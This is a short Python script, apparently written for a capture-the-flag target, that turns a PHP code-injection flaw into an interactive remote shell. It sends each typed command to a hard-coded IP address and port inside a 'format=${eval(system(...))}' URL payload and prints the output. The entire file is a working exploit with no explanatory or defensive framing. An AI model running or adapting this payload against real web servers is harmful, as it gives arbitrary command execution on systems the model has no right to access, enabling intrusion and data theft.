import requests, urllib.parse
while True:
    cmd = input("$ ")
    if cmd[:2] == "cd":
        print('$ soryy cd is shutdown...')
        continue
    cmd += " 2>&1"
    res = requests.get('http://167.99.202.9:30709/?format=${eval(system($_GET[0]))}&0=' + urllib.parse.quote(cmd))
    print(res.text.strip())